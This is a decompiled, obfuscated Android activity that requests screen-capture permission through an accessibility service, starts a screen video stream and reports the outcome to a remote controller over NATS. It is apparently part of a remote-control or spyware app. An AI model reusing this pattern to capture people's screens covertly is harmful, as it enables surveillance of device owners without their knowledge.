package com.mamimobi.videostream;

import android.app.Activity;
import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import com.mamimobi.AccessService;
import defpackage.o71;
import defpackage.t40;
import io.nats.client.support.ApiConstants;
import org.json.JSONObject;

/* JADX INFO: loaded from: classes.dex */
public class ScreenRequestActivity extends Activity {
    @Override // android.app.Activity
    public final void onActivityResult(int i, int i2, Intent intent) {
        super.onActivityResult(i, i2, intent);
        String str = AccessService.V;
        if (i == 4499 && i2 == -1) {
            AccessService accessService = AccessService.e0;
            if (accessService != null && accessService.H != null) {
                try {
                    String strV = t40.V(accessService);
                    JSONObject jSONObject = new JSONObject();
                    jSONObject.put(ApiConstants.ID, "screen_request");
                    jSONObject.put(ApiConstants.DATA, "屏幕共享授权成功！");
                    AccessService.e0.H.b(jSONObject.toString(), strV);
                } catch (Exception unused) {
                }
            }
            o71.f(this).g = intent;
            VideoStreamService.b(this, VideoSourceType.SCREEN);
        } else {
            AccessService accessService2 = AccessService.e0;
            if (accessService2 != null && accessService2.H != null) {
                try {
                    String strV2 = t40.V(accessService2);
                    JSONObject jSONObject2 = new JSONObject();
                    jSONObject2.put(ApiConstants.ID, "screen_request");
                    jSONObject2.put(ApiConstants.DATA, "屏幕共享授权失败！");
                    AccessService.e0.H.b(jSONObject2.toString(), strV2);
                } catch (Exception unused2) {
                }
            }
        }
        AccessService.s();
        super.finish();
    }

    @Override // android.app.Activity
    public final void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        getWindow().setFlags(16, 16);
        getWindow().setFlags(1024, 1024);
        AccessService.I();
        Intent intentCreateScreenCaptureIntent = ((MediaProjectionManager) getSystemService("media_projection")).createScreenCaptureIntent();
        if (Build.VERSION.SDK_INT >= 34) {
            intentCreateScreenCaptureIntent.putExtra("android.media.projection.extra.PREFERRED_CAPTURE_MODE", 1);
        }
        startActivityForResult(intentCreateScreenCaptureIntent, 4499);
    }

    @Override // android.app.Activity
    public final void onDestroy() {
        super.onDestroy();
    }
}
